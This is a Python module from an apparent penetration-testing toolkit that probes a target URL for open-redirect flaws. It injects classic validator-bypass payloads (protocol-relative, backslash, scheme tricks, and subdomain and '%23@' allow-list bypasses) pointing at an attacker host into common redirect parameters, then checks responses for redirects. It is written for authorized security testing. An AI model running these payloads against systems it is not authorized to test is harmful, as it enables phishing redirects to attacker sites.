"""Open redirect tester.

Injects a fixed, bounded set of classic open-redirect bypass payloads --
built from an operator-controlled attacker destination (``evil``) -- into
common redirect-carrying parameters and inspects the *raw* response (no
redirects followed, per the shared HTTP client's ``allow_redirects=False``)
for evidence that the target actually hands control of the destination host
to the client:

    * a 3xx response whose ``Location`` header resolves to the attacker host
      (direct server-side open redirect -- high confidence), or
    * a ``<meta http-equiv="refresh">`` tag or a ``location.href`` /
      ``location.replace(...)`` JavaScript assignment in the response body
      pointing at the attacker host (client-side redirect -- medium
      confidence, since it depends on a browser actually rendering the page).

The payload set purposefully includes a few well-known validator-bypass
shapes, not just the plain absolute URL:

    * ``//evil-host``               -- protocol-relative
    * ``/\\evil-host``               -- backslash-as-slash (legacy browser
                                        lenience for some special schemes)
    * ``scheme:/\\evil-host``        -- malformed scheme + backslash
    * ``scheme:evil-host``          -- scheme with no ``//`` at all (some
                                        URL parsers still treat this as
                                        absolute for http/https)
    * ``scheme://target-host.evil-host/``
                                     -- fools a naive
                                        ``redirect.startswith(allowed_host)``
                                        check: the string starts with the
                                        real host but the actual authority is
                                        a subdomain of the attacker's domain
    * ``scheme://evil-host%23@target-host/``
                                     -- fools a naive substring/allow-list
                                        check that only looks for
                                        ``target-host`` appearing somewhere
                                        in the (possibly percent-decoded)
                                        string; a client that decodes ``%23``
                                        to ``#`` before resolving the host
                                        sees only ``evil-host`` as the
                                        authority, with everything from the
                                        fragment onward -- including
                                        ``target-host`` -- discarded

Design constraints (redkit invariants):
    * NO AI/LLM usage -- every verdict here is a deterministic string/host
      comparison.
    * Pure standard library. All HTTP goes through the shared
      :mod:`redkit.core.http` client (proxy/cookie/header/TLS/timeout
      aware); requests are always sent with ``allow_redirects=False`` so the
      raw ``Location`` header can be inspected directly instead of silently
      following the operator off to wherever it points.
    * Bounded: a fixed, small list of candidate parameter names and a fixed,
      small list of payloads, with a hard ceiling on the resulting
      param x payload request count and a capped thread pool
      (<= redkit's 20-thread limit).
    * Safe by default: GET is the default method; a body is only sent when
      the operator explicitly selects ``method=POST``. The attacker
      destination defaults to a non-resolving, IANA-reserved example domain
      (``evil.example``) so nothing is actually fetched cross-site by
      default -- only the *response* to our own request is inspected.

For AUTHORIZED security testing only.
"""
from __future__ import annotations

import re
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Any, Dict, List, Optional, Tuple

from redkit.core.http import WEB_COMMON_OPTIONS, Response, client_from_opts
from redkit.core.module import Module, Option, Result
from redkit.core.registry import register

# --------------------------------------------------------------------------- #
# tuning constants (all conservative / bounded)
# --------------------------------------------------------------------------- #
COMMON_REDIRECT_PARAMS: List[str] = [
    "url", "next", "redirect", "redirect_uri", "redir", "return", "returnUrl",
    "return_url", "dest", "destination", "continue", "goto", "r", "u", "link",
    "to", "out", "view", "page", "path", "forward", "callback", "image",
]

MAX_TOTAL_PROBES = 200   # hard ceiling on probe requests for one run
THREAD_CAP = 15          # concurrent probe workers (<= redkit's 20-thread cap)
BODY_SAMPLE = 100_000    # chars of response body inspected for meta/js signals

DEFAULT_EVIL = "http://evil.example/"

# A <meta ...> tag whose http-equiv is "refresh" AND whose content contains
# a url= target, regardless of attribute order.
_META_REFRESH_TAG_RE = re.compile(
    r"<meta\b(?=[^>]*http-equiv=[\"']?refresh)(?=[^>]*content=)[^>]*>",
    re.I,
)
_META_REFRESH_URL_RE = re.compile(r"url\s*=\s*([^\"'>\s]+)", re.I)

_JS_REDIRECT_RE = re.compile(
    r"(?:window\.)?location(?:\.href)?\s*=\s*[\"']([^\"']+)[\"']"
    r"|(?:window\.)?location\.replace\(\s*[\"']([^\"']+)[\"']\s*\)",
    re.I,
)


def _split_host(value: str) -> Tuple[str, str]:
    """Return ``(scheme, hostname)`` for an operator-supplied URL/host string."""
    value = (value or "").strip()
    if "://" not in value:
        value = f"http://{value}"
    parsed = urllib.parse.urlsplit(value)
    return parsed.scheme or "http", (parsed.hostname or "").lower()


def _build_payloads(evil: str, target_host: str) -> List[Tuple[str, str]]:
    """Build the fixed, bounded set of open-redirect bypass payload values."""
    scheme, evil_host = _split_host(evil)
    if not evil_host:
        evil_host = "evil.example"
    absolute = evil.strip() if "://" in (evil or "") else f"{scheme}://{evil_host}/"

    payloads: List[Tuple[str, str]] = [
        ("absolute", absolute),
        ("protocol-relative", f"//{evil_host}"),
        ("backslash-relative", f"/\\{evil_host}"),
        ("scheme-backslash", f"{scheme}:/\\{evil_host}"),
        ("scheme-no-slash", f"{scheme}:{evil_host}"),
    ]
    if target_host:
        payloads.append(("whitelist-subdomain-bypass", f"{scheme}://{target_host}.{evil_host}/"))
        payloads.append(("whitelist-fragment-userinfo-bypass", f"{scheme}://{evil_host}%23@{target_host}/"))
    return payloads


def _extract_host(candidate: str, base_url: str) -> str:
    """Best-effort resolve a (possibly relative/malformed) redirect target to
    a hostname, mirroring the lenient way real HTTP clients/browsers parse
    partial URLs: backslashes standing in for slashes, a scheme with no
    ``//`` at all, and an early-decoded ``%23`` (``#``) truncating the
    authority before any trailing bypass noise.
    """
    if not candidate:
        return ""
    s = candidate.strip().replace("\\", "/")

    # scheme with no '//' at all, e.g. "http:evil.example" -> "http://evil.example"
    m = re.match(r"^([a-zA-Z][a-zA-Z0-9+.\-]*):(?!/)([^/?#]+)(.*)$", s)
    if m and m.group(1).lower() in ("http", "https"):
        s = f"{m.group(1)}://{m.group(2)}{m.group(3)}"

    # a raw '%23' immediately before '@' behaves, for host-resolution
    # purposes, like an actual '#': everything from there on is fragment
    # noise once decoded, so the true authority is whatever precedes it.
    s = re.sub(r"%23@", "#@", s, flags=re.I)
    if "#@" in s:
        s = s.split("#@", 1)[0]

    try:
        joined = urllib.parse.urljoin(base_url, s)
        host = urllib.parse.urlsplit(joined).hostname or ""
    except ValueError:
        host = ""
    return host.lower()


def _host_matches(host: str, evil_host: str) -> bool:
    return bool(host) and (host == evil_host or host.endswith("." + evil_host))


def _detect(resp: Response, target_url: str, evil_host: str) -> Tuple[bool, str, str, str]:
    """Inspect one probe response for evidence it redirects to ``evil_host``.

    Returns ``(matched, signal, severity, location)``.
    """
    if 300 <= resp.status < 400:
        location = resp.header("location", "")
        if location and _host_matches(_extract_host(location, target_url), evil_host):
            return True, "location-header", "high", location

    if resp.body:
        text = resp.text[:BODY_SAMPLE]

        meta_tag = _META_REFRESH_TAG_RE.search(text)
        if meta_tag:
            url_match = _META_REFRESH_URL_RE.search(meta_tag.group(0))
            if url_match:
                candidate = url_match.group(1)
                if _host_matches(_extract_host(candidate, target_url), evil_host):
                    return True, "meta-refresh", "medium", candidate

        js_match = _JS_REDIRECT_RE.search(text)
        if js_match:
            candidate = js_match.group(1) or js_match.group(2) or ""
            if candidate and _host_matches(_extract_host(candidate, target_url), evil_host):
                return True, "js-redirect", "medium", candidate

    return False, "", "", ""


def _set_query_param(url: str, name: str, value: str) -> str:
    parts = urllib.parse.urlsplit(url)
    pairs = urllib.parse.parse_qsl(parts.query, keep_blank_values=True)
    found = False
    new_pairs: List[Tuple[str, str]] = []
    for k, v in pairs:
        if k == name:
            new_pairs.append((k, value))
            found = True
        else:
            new_pairs.append((k, v))
    if not found:
        new_pairs.append((name, value))
    new_query = urllib.parse.urlencode(new_pairs)
    return urllib.parse.urlunsplit((parts.scheme, parts.netloc, parts.path, new_query, parts.fragment))


def _set_body_param(data: str, name: str, value: str) -> str:
    pairs = urllib.parse.parse_qsl(data or "", keep_blank_values=True)
    found = False
    new_pairs: List[Tuple[str, str]] = []
    for k, v in pairs:
        if k == name:
            new_pairs.append((k, value))
            found = True
        else:
            new_pairs.append((k, v))
    if not found:
        new_pairs.append((name, value))
    return urllib.parse.urlencode(new_pairs)


@register
class OpenRedirect(Module):
    """Open redirect tester (Location header / meta-refresh / JS redirect)."""

    name = "web.redirect"
    description = "Open redirect tester: bypass payloads against redirect-carrying parameters"
    phase = "web"
    options = [
        Option("url", help="target URL, e.g. https://host/login?next=/dashboard", required=True),
        Option(
            "param",
            default="",
            help="parameter name to target (default: auto-target common redirect params)",
        ),
        Option(
            "evil",
            default=DEFAULT_EVIL,
            help="attacker-controlled destination used to detect success (non-resolving by default)",
        ),
        Option("method", default="GET", choices=["GET", "POST"], help="HTTP method used for probes"),
        Option("data", default="", help="urlencoded POST body template, e.g. 'a=1&next=/x' (used when method=POST)"),
    ] + WEB_COMMON_OPTIONS
    references = [
        "https://owasp.org/www-community/attacks/Unvalidated_Redirects_and_Forwards_Cheat_Sheet",
        "https://portswigger.net/kb/issues/00500100_open-redirection-reflected",
        "https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html",
    ]

    def run(self, opts: Dict[str, Any], ctx) -> Result:
        console = ctx.console

        raw_url = str(opts["url"]).strip()
        if "://" not in raw_url:
            raw_url = "http://" + raw_url
        parsed = urllib.parse.urlsplit(raw_url)
        if not parsed.hostname:
            return Result(ok=False, summary=f"invalid url: {opts['url']!r} (expected http(s)://host/...)")
        target_host = parsed.hostname
        ctx.engagement.add_host(target_host)

        method = str(opts.get("method") or "GET").upper()
        if method not in ("GET", "POST"):
            method = "GET"
        raw_data = str(opts.get("data") or "")
        param_opt = str(opts.get("param") or "").strip()
        evil = str(opts.get("evil") or DEFAULT_EVIL).strip() or DEFAULT_EVIL
        _, evil_host = _split_host(evil)
        if not evil_host:
            return Result(ok=False, summary=f"invalid evil destination: {evil!r}")

        client = client_from_opts(opts)

        # -- reachability check: don't spend the probe budget on a dead host
        baseline = client.request(method, raw_url, data=(raw_data or None) if method == "POST" else None,
                                   headers={"Content-Type": "application/x-www-form-urlencoded"} if (method == "POST" and raw_data) else None,
                                   allow_redirects=False)
        if baseline.error and baseline.status == 0:
            summary = f"{raw_url} unreachable: {baseline.error}"
            console.warn(summary)
            ctx.engagement.add_note(f"web.redirect: {summary}")
            return Result(ok=False, summary=summary, data={"url": raw_url, "error": baseline.error, "hits": []})

        params = [param_opt] if param_opt else list(COMMON_REDIRECT_PARAMS)
        payloads = _build_payloads(evil, target_host)

        console.banner("Open redirect test", raw_url)
        console.info(
            f"probing {len(params)} candidate param(s) x {len(payloads)} payload(s) "
            f"toward evil={evil_host!r}, method={method}"
        )

        # -- build the (param, label, payload) task list, payload-major so
        # a hard cap still gives every candidate param a shot at the
        # cheapest/most-common bypass shapes before spending budget on the
        # more exotic ones.
        tasks: List[Tuple[str, str, str]] = [
            (name, label, payload) for (label, payload) in payloads for name in params
        ][:MAX_TOTAL_PROBES]

        def _probe(name: str, label: str, payload: str):
            if method == "POST":
                body = _set_body_param(raw_data, name, payload)
                resp = client.post(
                    raw_url,
                    data=body,
                    headers={"Content-Type": "application/x-www-form-urlencoded"},
                    allow_redirects=False,
                )
            else:
                target_url = _set_query_param(raw_url, name, payload)
                resp = client.get(target_url, allow_redirects=False)
            return name, label, payload, resp

        results: List[Tuple[str, str, str, Response]] = []
        workers = max(1, min(THREAD_CAP, len(tasks)))
        with ThreadPoolExecutor(max_workers=workers) as pool:
            futures = [pool.submit(_probe, *task) for task in tasks]
            for fut in as_completed(futures):
                try:
                    results.append(fut.result())
                except Exception:  # noqa: BLE001 - one probe failing must never abort the run
                    continue

        hits: List[Dict[str, Any]] = []
        for name, label, payload, resp in results:
            if resp.error and resp.status == 0:
                continue
            matched, signal, severity, location = _detect(resp, raw_url, evil_host)
            if not matched:
                continue
            hit = {
                "param": name,
                "payload": payload,
                "location": location,
                "bypass": label,
                "signal": signal,
                "severity": severity,
                "status": resp.status,
            }
            hits.append(hit)

            title = f"Open redirect via '{name}' parameter ({label})"
            description = (
                f"{method} {raw_url} with parameter '{name}' set to {payload!r} produced a "
                f"{signal.replace('-', ' ')} pointing at the attacker-controlled host "
                f"'{evil_host}' (HTTP {resp.status})."
            )
            ctx.engagement.add_finding(
                title,
                severity=severity,
                host=target_host,
                description=description,
                evidence=f"param={name} payload={payload} location={location!r}",
            )
            if severity == "high":
                console.bad(f"open redirect: {name} ({label}) -> {location!r} [{severity}]")
            else:
                console.warn(f"open redirect: {name} ({label}) -> {location!r} [{severity}]")

        hits.sort(key=lambda h: (0 if h["severity"] == "high" else 1, str(h["param"]), str(h["bypass"])))

        data: Dict[str, Any] = {
            "url": raw_url,
            "host": target_host,
            "method": method,
            "evil": evil,
            "evil_host": evil_host,
            "params_tested": params,
            "payloads_tested": [label for label, _ in payloads],
            "requests_sent": len(tasks),
            "hits": hits,
        }

        artifacts: List[str] = []
        try:
            import json

            safe_host = target_host.replace(":", "_")
            path = ctx.artifact_path(f"redirect_{safe_host}.json")
            path.write_text(json.dumps(data, indent=2, ensure_ascii=False), encoding="utf-8")
            artifacts.append(str(path))
        except OSError:
            pass

        summary = (
            f"{raw_url}: probed {len(params)} param(s) x {len(payloads)} payload(s) "
            f"({len(tasks)} request(s)); {len(hits)} open redirect hit(s)"
        )
        if hits:
            ctx.engagement.add_note(f"web.redirect: {summary}")
        return Result(ok=True, summary=summary, data=data, artifacts=artifacts)
